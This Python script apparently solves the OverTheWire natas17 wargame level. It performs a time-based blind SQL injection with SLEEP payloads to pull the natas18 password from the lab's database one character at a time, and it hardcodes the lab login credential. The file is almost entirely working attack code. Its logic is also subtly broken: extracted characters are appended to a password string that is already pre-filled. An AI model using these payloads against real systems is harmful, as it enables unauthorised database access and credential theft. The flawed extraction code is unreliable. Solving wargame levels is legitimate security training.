import requests
from requests.auth import HTTPBasicAuth
import string
import time

url = "http://natas17.natas.labs.overthewire.org"
auth = HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')

# First, let's test if time-based injection works
print("Testing basic time-based injection...")
test_payload = 'natas18" AND SLEEP(5)-- -'
start = time.time()
r = requests.post(url, auth=auth, data={'username': test_payload}, timeout=10)
elapsed = time.time() - start
print(f"Test delay: {elapsed:.2f} seconds")

if elapsed < 4:
    print("Time-based injection might not be working. Let's try another approach...")

# Extract password
password = "6OG1PbKdVjyBlpxgDgDDbRk6ZLlCGgeJ"
charset = string.ascii_letters + string.digits

print("\nExtracting password...")
for position in range(1, 60):
    found = False
    for char in charset:
        # Try this injection
        payload = f'natas18" AND IF(BINARY SUBSTRING(password,{position},1)="{char}", SLEEP(2), 0)-- -'
        
        try:
            start = time.time()
            r = requests.post(url, auth=auth, data={'username': payload}, timeout=5)
            elapsed = time.time() - start
            
            if elapsed >= 1.8:  # If it delayed ~2 seconds
                password += char
                print(f"Position {position}: {char} (Password: {password})")
                found = True
                break
        except requests.Timeout:
            # Timeout means it's sleeping
            password += char
            print(f"Position {position}: {char} (Password: {password})")
            found = True
            break
        except Exception as e:
            print(f"Error: {e}")
            continue
    
    if not found:
        print(f"Could not find character at position {position}")
        break

print(f"\nFinal password: {password}")